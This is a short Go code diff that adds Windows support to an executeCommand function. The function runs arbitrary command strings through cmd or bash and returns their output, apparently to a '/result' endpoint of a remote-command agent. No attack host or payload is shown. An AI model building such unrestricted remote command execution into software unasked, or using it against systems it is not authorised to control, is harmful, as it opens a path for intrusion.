@@ -16,6 +16,7 @@ import (
 	"os"
 	"os/exec"
 	"os/user"
+	"runtime"
 	"strings"
 	"time"
 )
@@ -201,11 +202,19 @@ func executeCommand(command string) string {
 
 		// Execute a simple bash command, and return the output to /result endpoint
 	} else {
-		out, err := exec.Command("/bin/bash", "-c", command).CombinedOutput()
-		if err != nil {
-			return err.Error() + string(out)
+		if runtime.GOOS == "windows" {
+			out, err := exec.Command("cmd", "/C", command).CombinedOutput()
+			if err != nil {
+				return err.Error() + string(out)
+			}
+			return string(out)
+		} else {
+			out, err := exec.Command("/bin/bash", "-c", command).CombinedOutput()
+			if err != nil {
+				return err.Error() + string(out)
+			}
+			return string(out)
 		}
-		return string(out)
 	}
 }
 
